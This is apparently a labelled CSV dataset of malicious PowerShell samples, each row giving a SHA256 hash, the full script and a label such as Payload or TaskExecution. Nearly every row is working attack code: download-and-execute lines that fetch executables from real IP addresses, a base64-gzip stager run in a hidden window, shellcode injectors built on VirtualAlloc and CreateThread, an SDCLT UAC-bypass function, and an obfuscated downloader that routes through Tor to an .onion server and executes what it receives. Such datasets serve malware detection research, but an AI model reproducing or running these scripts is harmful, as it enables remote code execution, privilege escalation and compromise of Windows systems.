SHA256,Full Payload,Label
4af7562b8ca6f68be6a55c4070fc4746727991c61f81392cc3bb52990d80c5c1,"
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

",Payload
3faa02273f44e19906cb95be4678e067f6e5862d40d87aa1f11116675432cf20,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIACSNllcCA71WbW/iOBD+3Er7H6IVUhId5b3ttdJKlwCBtKQLTYECi05u4iQGE1PHocDe/vebQNJStb3b2w8XFdWxZ+xnnnnGEy8OHUFYKM17zapp0aXndQzp+6fjoy7iaCEpOdSL4k3XWflCq+alHJ3dsP5aPToCk9xj3ApqkW9JXyRloi2XDbZAJJxeXtZjznEo9u+FFhZaFOHFAyU4UlTpL2kYYI5Pvj7MsCOk71Luz0KLsgdEU7NNHTkBlk600E3WOsxBCciCvaREKPK3b7I6OSlPC83HGNFIke1NJPCi4FIqq9IPNTnwbrPEimwRh7OIeaIwJGG1UuiHEfLwDey2whYWAXMjWYVI4I9jEfNQeo4p2WRvosgw7HLmaK7LcQQeBTNcsTlWcmFMaV76Q5mkCG7jUJAFhnWBOVvamK+Ig6NCG4UuxbfYmyo3+CkL/GedlEMnsOoKruYhNR9AtZgbU7z3ltW3YF+lVIXnJa3AxY9Px5+OvUwWwmweqgFGR5PdGANWpcsisjP7IpXykgUnIsH4Bl5zdzzG6lSaJHmYTKdSjgTsIvTM8/zHe5QzBzBfDc7OR37jgZVMWJkMGHGn4JkmK+c78eguWfhYdQ3skRA3NiFaECcTlvIe/9ijeBduITO7AXCKnC5gt4Ep9pFI2MxLk7duzQURz756TKiLueZADiNABelVX4PZJ0iRzdDCC+Br/y5DGjyQM86sUwlvstOTdzCS6xRFUV7qxlBPTl6yMaLYzUtaGJF0SYsF2w3lF7hWTAVxUCSy7abqM5HpgXUWRoLHDuQQgr+zl9ghiCZc5KU2cbG+sYmfHSy/y0QdUUpCH3ZaQSZgJmHAFokyOGB8VoFasLEwF0uKF2C3q26DIh9qOa2GnZyQj135DcxM6ntdJ4xkVByAhDTblIm8NCBcwC2RsHugqV+HcnBV7EHVOU6To2TlM9E3IlF9bnsfLy/K94lQU652zHABrBicLXQU4bOaLThwpnwufiV1DZ6RGVLL0eekrD2RsmnBr0+qJmucu9dXs3aRN9aBp5mRabW7jV67XVtd2YOasJumuO6awmrez2a21r7tj8TY1Np3pDQf1bbLK7K1O5o7WhfPtvr2qaSvtzPf9UYNz/PPPfu2fGqQzrDe00sV1Gk0485Qf9JLtahJnto90u/NrwzxMBpQ1PeK/n35ApF1h88GZWZtTU1rBVVne+UNWoHlbkbt4sWwNteamlYPmwNDZ9cjnWvd4qBv6L1+U+/1YO7ML3o1mKO/BUnYGg6D2Si8om71djuun87HrdNtZ3FKXU0fDY3gl35aiyyvG7YGeDo9ff2oD3Sm+VrYqIULFOjDQYWMl/e3AawbEKZVLNVMF6/Z750hGayKA+Trj7oxvkdaZ7wxisXyKKqgOeyhA2Bj/Ahxj5ZGl4L/Xb/CtAG9ebHttRvXzrh8HllfPifaAfHkBK8cyOGju99CPAoQBZnAhZ5VrMG4kV7MXUYSD0V51bfnmIeYQp+DTpgJX6OUOUm7SK5y6FT7/jGF6u3DsFp5d6RKz4bqSwfJpi4vxwAWSiiVd6GDQ18E+dK6WipBIyitayUI9+djrLPlRsl2yye9JKHp4AC6O0BNaiu3DU7b/w+DaWUH8M/9FwZf5v5h9adYLeV3sb+ZfT3xn+j9ZQKGiAjwsOF2onjfNN/lIRXNwbdGkiTQg5c+yTff11ic3MAnyN9CrE0ocwoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
b125c11af10487ff717ea12075f3391acc0ae4f4271517c061fcd110daac33c3,"function Invoke-SDCLTBypass {


    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if(($(whoami /groups) -like ""*S-1-5-32-544*"").length -eq 0) {
        ""[!] Current user not a local administrator!""
        Throw (""Current user not a local administrator!"")
    }
    if (($(whoami /groups) -like ""*S-1-16-8192*"").length -eq 0) {
        ""[!] Not in a medium integrity process!""
        Throw (""Not in a medium integrity process!"")
    }

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        ""UAC is set to 'Always Notify'. This module does not bypass this setting.""
        exit
    }
    else{
        
        
        $RegPath = 'HKCU:Software\Microsoft\Windows\Update'
        $parts = $RegPath.split('\');
        $path = $RegPath.split(""\"")[0..($parts.count -2)] -join '\';
        $name = $parts[-1];
        $null = Set-ItemProperty -Force -Path $path -Name $name -Value $Command;


        $exeCommandPath = ""HKCU:\Software\Classes\exefile\shell\runas\command""
        $launcherCommand = $pshome + '\' + 'powershell.exe -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -w Hidden -enc $x'

        if ($Force -or ((Get-ItemProperty -Path $exeCommandPath -Name 'IsolatedCommand' -ErrorAction SilentlyContinue) -eq $null)){
            New-Item $exeCommandPath -Force |
                New-ItemProperty -Name 'IsolatedCommand' -Value $launcherCommand -PropertyType string -Force | Out-Null
        }else{
            Write-Warning ""Key already exists, consider using -Force""
            exit
        }

        if (Test-Path $exeCommandPath) {
            Write-Verbose ""Created registry entries to hijack the exe runas extension""
        }else{
            Write-Warning ""Failed to create registry key, exiting""
            exit
        }

        $sdcltPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'sdclt.exe'
        if ($PSCmdlet.ShouldProcess($sdcltPath, 'Start process')) {
            $Process = Start-Process -FilePath $sdcltPath -ArgumentList '/kickoffelev' -PassThru
            Write-Verbose ""Started sdclt.exe""
        }

        
        Write-Verbose ""Sleeping 5 seconds to trigger payload""
        if (-not $PSBoundParameters['WhatIf']) {
            Start-Sleep -Seconds 5
        }

        $exefilePath = ""HKCU:\Software\Classes\exefile""
				$PayloadPath = 'HKCU:Software\Microsoft\Windows'
				$PayloadKey = ""Update""

        if (Test-Path $exefilePath) {
            
            Remove-Item $exefilePath -Recurse -Force
						Remove-ItemProperty -Force -Path $PayloadPath -Name $PayloadKey
            Write-Verbose ""Removed registry entries""
        }

        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
            Stop-Process -Id $Process.Id
            Write-Verbose ""Killed running sdclt process""
        }
    }
}
",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
52adcbd4df6e860ca279cb0bc180cb3d67cf5f4c88de42a3569f16615919f865,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb0,0xe4,0x29,0x71,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
adeffa00d96e50a69bde640f9b4bca00be2ec8f4aa06a9827119ad857b45cd12,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
ee69427f5fcd414f6c97e8e361a37401b69943bc48fb61a598d601b048ae9499,"
'xneZtEDC';$ErrorActionPreference = 'SilentlyContinue';'uqaaPxuaCN';'DOBHbJqlkRM';$kn = (get-wmiobject Win32_ComputerSystemProduct).UUID;'WVy';'gKEZgPRMl';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $kn){;'mUzql';'jsvZDTQITNa';(Get-Process -id $pid).Kill();'NgpYRhj';'hVXjCtDvBc';};'tUVXQmXbZ';'lkTzhJZHwxU';'McPzodeY';'vNNYv';function e($dkez){;'TfPD';'WTw';$jt = (((iex ""nslookup -querytype=txt $dkez 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'HdCjwAD';'sVSjtZRvr';$ovg.DownloadFile($jt, $tg);'raVw';'OQNdBkS';$ei = $ke.NameSpace($tg).Items();'OgnucmQlK';'Qfqxov';$ke.NameSpace($sa).CopyHere($ei, 20);'GBMdJNr';'VMWS';rd $tg;'pnoFau';'SedloE';};'NxPZPIV';'ypi';'AFElBzCp';'bYRWML';'UYANxqtLg';'QBC';$sa = $env:APPDATA + '\' + $kn;'Eaxyty';'IwuaOh';if (!(Test-Path $sa)){;'amYmrKg';'vWAgqtEB';$qr = New-Item -ItemType Directory -Force -Path $sa;'GqNII';'HNPIQutUpGv';$qr.Attributes = ""Hidden"", ""System"", ""NotContentIndexed"";'MuRuRa';'CmlkCszVCO';};'ZdmIGyj';'nAYhOpvWV';'BIAgIntvoU';'GJTBzyjr';$zul=$sa+ '\tor.exe';'swInqmX';'LTXwOFNSuL';$axs=$sa+ '\polipo.exe';'qkI';'WJPoaNnarn';$tg=$sa+'\'+$kn+'.zip';'Sgw';'fYthyZ';$ovg=New-Object System.Net.WebClient;'Ils';'GRldQfFnfQK';$ke=New-Object -C Shell.Application;'vVoutJQ';'gHXAsaxc';'llaetDv';'Zix';if (!(Test-Path $zul) -or !(Test-Path $axs)){;'QtJINrwhS';'XkAxtKLAJ';e 'i.vankin.de';'QqVujkSIPS';'dZdn';};'GoemQSlIB';'IOcJU';'FYTMzpCupR';'qEnstu';if (!(Test-Path $zul) -or !(Test-Path $axs)){;'ZGtSt';'mHkBgIOsU';e 'gg.ibiz.cc';'sDtXmE';'xSBk';};'YaiaAJqKPin';'gFVK';'TumvJVvJKRm';'ULQwp';$pj=$sa+'\roaminglog';'numdmmhA';'ytEF';saps $zul -Ar "" --Log `""notice file $pj`"""" -wi Hidden;'JCBc';'CjHbOtf';do{sleep 1;$xxl=gc $pj}while(!($xxl -match 'Bootstrapped 100%: Done.'));'wYtpNVJtdz';'XggiQIPFt';saps $axs -a ""socksParentProxy=localhost:9050"" -wi Hidden;'dlV';'zVLSO';sleep 7;'FzlDdEynuUz';'Ci';$zpp=New-Object System.Net.WebProxy(""localhost:8123"");'MsOkmLs';'zRW';$zpp.useDefaultCredentials = $true;'PWXVXIMqb';'lAy';$ovg.proxy=$zpp;'gEkdkGPjVp';'xerooSjz';$ca='http://powerwormjqj42hu.onion/get.php?s=setup&mom=14C6EFBB-F19D-DC11-83A7-001B38A0DF85&uid=' + $kn;'SGCFq';'GkVVnp';while(!$qmh){$qmh=$ovg.downloadString($ca)};'rHo';'jtshvrR';if ($qmh -ne 'none'){;'Ju';'VuUTlp';iex $qmh;'blhE';'AeIepyNd';};'whSp';

",TaskExecution
d6e03248539aaed3fc2c22d091c8c8f0e13418e1f54a9333cfdc0c50f888f0a7,"
$y4T = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $y4T -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x51,0xd0,0x47,0x36,0xd9,0xee,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x6a,0x0f,0x03,0x6a,0x5e,0x32,0xb2,0xca,0x88,0x30,0x3d,0x33,0x48,0x55,0xb7,0xd6,0x79,0x55,0xa3,0x93,0x29,0x65,0xa7,0xf6,0xc5,0x0e,0xe5,0xe2,0x5e,0x62,0x22,0x04,0xd7,0xc9,0x14,0x2b,0xe8,0x62,0x64,0x2a,0x6a,0x79,0xb9,0x8c,0x53,0xb2,0xcc,0xcd,0x94,0xaf,0x3d,0x9f,0x4d,0xbb,0x90,0x30,0xfa,0xf1,0x28,0xba,0xb0,0x14,0x29,0x5f,0x00,0x16,0x18,0xce,0x1b,0x41,0xba,0xf0,0xc8,0xf9,0xf3,0xea,0x0d,0xc7,0x4a,0x80,0xe5,0xb3,0x4c,0x40,0x34,0x3b,0xe2,0xad,0xf9,0xce,0xfa,0xea,0x3d,0x31,0x89,0x02,0x3e,0xcc,0x8a,0xd0,0x3d,0x0a,0x1e,0xc3,0xe5,0xd9,0xb8,0x2f,0x14,0x0d,0x5e,0xbb,0x1a,0xfa,0x14,0xe3,0x3e,0xfd,0xf9,0x9f,0x3a,0x76,0xfc,0x4f,0xcb,0xcc,0xdb,0x4b,0x90,0x97,0x42,0xcd,0x7c,0x79,0x7a,0x0d,0xdf,0x26,0xde,0x45,0xcd,0x33,0x53,0x04,0x99,0xf0,0x5e,0xb7,0x59,0x9f,0xe9,0xc4,0x6b,0x00,0x42,0x43,0xc7,0xc9,0x4c,0x94,0x28,0xe0,0x29,0x0a,0xd7,0x0b,0x4a,0x02,0x13,0x5f,0x1a,0x3c,0xb2,0xe0,0xf1,0xbc,0x3b,0x35,0x6f,0xb8,0xab,0x76,0xd8,0xc3,0x2d,0x1f,0x1b,0xc4,0x31,0xb0,0x92,0x22,0x61,0x1e,0xf5,0xfa,0xc1,0xce,0xb5,0xaa,0xa9,0x04,0x3a,0x94,0xc9,0x26,0x90,0xbd,0x63,0xc9,0x4d,0x95,0x1b,0x70,0xd4,0x6d,0xba,0x7d,0xc2,0x0b,0xfc,0xf6,0xe1,0xec,0xb2,0xfe,0x8c,0xfe,0x22,0x0f,0xdb,0x5d,0xe4,0x10,0xf1,0xc8,0x08,0x85,0xfe,0x5a,0x5f,0x31,0xfd,0xbb,0x97,0x9e,0xfe,0xe9,0xac,0x17,0x6b,0x52,0xda,0x57,0x7b,0x52,0x1a,0x0e,0x11,0x52,0x72,0xf6,0x41,0x01,0x67,0xf9,0x5f,0x35,0x34,0x6c,0x60,0x6c,0xe9,0x27,0x08,0x92,0xd4,0x00,0x97,0x6d,0x33,0x91,0xeb,0xbb,0x7d,0xe7,0x05,0x78;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$s6m=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($s6m.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$s6m,0,0,0);for (;;){Start-sleep 60};

",Payload
3a1192b8a35398e9308e52f26aeb1640b768f07afb1f7ccc19c5026410bef66b,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x8f,0xc4,0x4b,0x2f,0xdd,0xc1,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x83,0xe8,0xfc,0x31,0x50,0x0f,0x03,0x50,0x80,0x26,0xbe,0xd3,0x76,0x24,0x41,0x2c,0x86,0x49,0xcb,0xc9,0xb7,0x49,0xaf,0x9a,0xe7,0x79,0xbb,0xcf,0x0b,0xf1,0xe9,0xfb,0x98,0x77,0x26,0x0b,0x29,0x3d,0x10,0x22,0xaa,0x6e,0x60,0x25,0x28,0x6d,0xb5,0x85,0x11,0xbe,0xc8,0xc4,0x56,0xa3,0x21,0x94,0x0f,0xaf,0x94,0x09,0x24,0xe5,0x24,0xa1,0x76,0xeb,0x2c,0x56,0xce,0x0a,0x1c,0xc9,0x45,0x55,0xbe,0xeb,0x8a,0xed,0xf7,0xf3,0xcf,0xc8,0x4e,0x8f,0x3b,0xa6,0x50,0x59,0x72,0x47,0xfe,0xa4,0xbb,0xba,0xfe,0xe1,0x7b,0x25,0x75,0x18,0x78,0xd8,0x8e,0xdf,0x03,0x06,0x1a,0xc4,0xa3,0xcd,0xbc,0x20,0x52,0x01,0x5a,0xa2,0x58,0xee,0x28,0xec,0x7c,0xf1,0xfd,0x86,0x78,0x7a,0x00,0x49,0x09,0x38,0x27,0x4d,0x52,0x9a,0x46,0xd4,0x3e,0x4d,0x76,0x06,0xe1,0x32,0xd2,0x4c,0x0f,0x26,0x6f,0x0f,0x47,0x8b,0x42,0xb0,0x97,0x83,0xd5,0xc3,0xa5,0x0c,0x4e,0x4c,0x85,0xc5,0x48,0x8b,0xea,0xff,0x2d,0x03,0x15,0x00,0x4e,0x0d,0xd1,0x54,0x1e,0x25,0xf0,0xd4,0xf5,0xb5,0xfd,0x00,0x63,0xb3,0x69,0xf9,0x25,0x85,0x10,0x95,0xc7,0xf9,0xed,0x15,0x41,0x1f,0xa1,0x85,0x01,0xb0,0x01,0x76,0xe2,0x60,0xe9,0x9c,0xed,0x5f,0x09,0x9f,0x27,0xc8,0xa3,0x70,0x9e,0xa0,0x5b,0xe8,0xbb,0x3b,0xfa,0xf5,0x11,0x46,0x3c,0x7d,0x96,0xb6,0xf2,0x76,0xd3,0xa4,0x62,0x77,0xae,0x97,0x24,0x88,0x04,0xbd,0xc8,0x1c,0xa3,0x14,0x9f,0x88,0xa9,0x41,0xd7,0x16,0x51,0xa4,0x6c,0x9e,0xc7,0x07,0x1a,0xdf,0x07,0x88,0xda,0x89,0x4d,0x88,0xb2,0x6d,0x36,0xdb,0xa7,0x71,0xe3,0x4f,0x74,0xe4,0x0c,0x26,0x29,0xaf,0x64,0xc4,0x14,0x87,0x2a,0x37,0x73,0x19,0x16,0xee,0xbd,0x6f,0x76,0x32;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
